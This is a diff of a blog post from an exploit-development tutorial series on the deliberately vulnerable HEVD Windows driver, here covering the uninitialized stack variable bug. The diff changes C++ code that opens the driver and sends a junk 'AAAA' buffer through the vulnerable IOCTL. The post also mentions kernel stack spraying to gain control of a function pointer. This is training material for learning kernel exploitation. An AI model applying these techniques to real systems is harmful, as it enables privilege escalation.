@@ -1,6 +1,6 @@
 ---
 layout: single
-title: HEVD Exploits -- Windows 7 x86-64 Uninitialized Stack Variable
+title: HEVD Exploits -- Windows 7 x86 Uninitialized Stack Variable
 date: 2020-02-09
 classes: wide
 header:
@@ -9,7 +9,7 @@ tags:
   - Exploit Dev
   - Drivers
   - Windows
-  - x86-64
+  - x86
   - Shellcoding
   - Kernel Exploitation
   - Uninitialized Stack Variable
@@ -33,7 +33,7 @@ This post/series will instead focus on my experience trying to craft the actual 
 ## HEVD Series Change
 I will no longer be using Python ctypes to write exploits. We will be using C++ from now on. I realize this is a big change for people following along so I've commented the code heavily. 
 
-I will no longer be doing x86 exploits, only x86-64 from now on. 
+I will try to avoid 32 bit exploits where possible and focus solely on 64 bit (except this one, I hated this one lol).  
 
 ## Goal
 This one is pretty straightforward, we'll be attacking HEVD as normal, this time looking at the uninitialized stack variable bug class. While this isn't super common (I don't think?), there is a very neat API we can leverage from userland to spray the kernel stack and set ourselves up nicely so that we can get control over a called function pointer value. 
@@ -48,7 +48,7 @@ We will be targeting a vulnerable function that triggers an uninitialized stack 
 
 We'll write some code that creates a handle to the driver and sends a phony payload just to see if we break on that memory location as anticipated. 
 
-You'll notice from our image above that the targeted block of instructions is denoted by a location of `loc_16A27`. We'll go the more realistic route here and pretend we don't have the driver symbols and just set a breakpoint on the loaded module name `HEVD` (if you're confused about this, enter `lm` to check the loaded modules in `kd>` and take a gander at the list), and then add a breakpoint at `!HEVD+0x6a27`, the `1` in the location is actually assuming a base address of  `0x0000000000010000`, so we can remove that and dynamically set the breakpoint at the offset. (I think?) BP is set, let's run our code and see if we hit it, we'll send a junk payload of `AAAAAAAA` right now for testing purposes. 
+You'll notice from our image above that the targeted block of instructions is denoted by a location of `loc_1571A`. We'll go the more realistic route here and pretend we don't have the driver symbols and just set a breakpoint on the loaded module name `HEVD` (if you're confused about this, enter `lm` to check the loaded modules in `kd>` and take a gander at the list), and then add a breakpoint at `!HEVD+0x571A`, the `1` in the location is actually assuming a base address of  `0x0000000000010000`, so we can remove that and dynamically set the breakpoint at the offset. (I think?) BP is set, let's run our code and see if we hit it, we'll send a junk payload of `AAAA` right now for testing purposes. 
 
 Our code will look like this at this point, I lifted the do-while loop right out of @TheColonial's [Capcom.sys YouTube video (must see)](https://www.youtube.com/watch?v=pJZjWXxUEl4):
 ```cpp
@@ -57,76 +57,50 @@ Our code will look like this at this point, I lifted the do-while loop right out
 #include <stdio.h>
 #include <iostream>
 
+//
+// Defining just our driver name that it uses for IoCreateDevice and also the IOCTL code we use to reach our vulnerable function
 #define DEVICE_NAME     "\\\\.\\HackSysExtremeVulnerableDriver"
 #define IOCTL           0x22202F
 
-// grabbing a handle to our driver with CreateFileA
-HANDLE get_handle(const char* device_name)
+HANDLE Get_Handle()
 {
-	// already a big advantage to using C++, we have access to the Windows constant values
-	HANDLE hevd = CreateFileA(device_name,
-		GENERIC_READ | GENERIC_WRITE,
+	HANDLE HEVD = CreateFileA(DEVICE_NAME,
+		FILE_READ_ACCESS | FILE_WRITE_ACCESS,
 		FILE_SHARE_READ | FILE_SHARE_WRITE,
-		NULL,
-		OPEN_EXISTING,
-		0,
-		NULL);
-	
-	// this will help us avoid lots of if statements as we can just loop until a condition is true, not particularly helpful here, but we'll be doing it more
-	do
-	{
-		if (hevd == INVALID_HANDLE_VALUE)
-		{
-			std::cout << "[!] Failed to retrieve handle to the device-driver with error-code:" << ("%x", GetLastError()) << "\n";
-			break;
-		}
-
-		std::cout << "[*] Successfully retrieved handle to device-driver:" << ("%p", hevd) << "\n";
-	
-	} while (0); 
-
-	return hevd;
-}
-
-void interact(HANDLE result)
-{
-	//specify the bytes we want to send, in this case 8 * \x41
-	BYTE inputBuff[] = "AAAAAAAA";
-	
-	//this parameter of DeviceIoControl has to actually exist so we have to make it, but we don't care about it
-	DWORD bytesRet = 0;
-
-	//calling DeviceIoControl, returns non-0 if success, which is a BOOL basically because it can be True (anything) or False (0)
-	//we're not specifying an output buffer in this case as we don't want any data returned from this IOCTL in particular, so that's null and it's size is 0
-	BOOL success = DeviceIoControl(result,
-		IOCTL,
-		inputBuff,
-		sizeof(inputBuff),
-		NULL,
-		0,
-		&bytesRet,
+		NULL, OPEN_EXISTING,
+		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
 		NULL);
 
-	if (success) 
+	if (HEVD == INVALID_HANDLE_VALUE)
 	{
-		std::cout << "[*] Payload sent to driver successfully.";
+		std::cout << "[!] Unable to retrieve handle for HEVD, last error: " << GetLastError() << "\n";
+		exit(1);
 	}
-	else
-	{
-		std::cout << "[!] Payload failed with error code: " << ("%x", GetLastError()) << "\n";
-	}
+
+	printf("[*] Successfully retrieved handle to HEVD: %X\n", HEVD);
+	return HEVD;
 }
 
 int main()
 {
-	// call our get_handle function with our hardcoded constant and return the result 
-	HANDLE result = get_handle(DEVICE_NAME);
+	HANDLE HEVD = Get_Handle();
 
-	// call our interact function which calls DeviceIoControl and requires our returned handle
-	interact(result);
+	// Just a dummy buffer so that we don't match the keyword value for BAD0B0B0
+	char Input_Buffer[] = "\x41\x41\x41\x41";
+	
+	DWORD Dummy_Bytes = 0;
 
-	return 0;
+	// Trigger bug
+	DeviceIoControl(HEVD,
+		0x22202F,
+		&Input_Buffer,
+		sizeof(Input_Buffer),
+		NULL,
+		0,
+		&Dummy_Bytes,
+		NULL); 
 }
+
 ```
 
 ![](/assets/images/AWE/wehit.PNG)
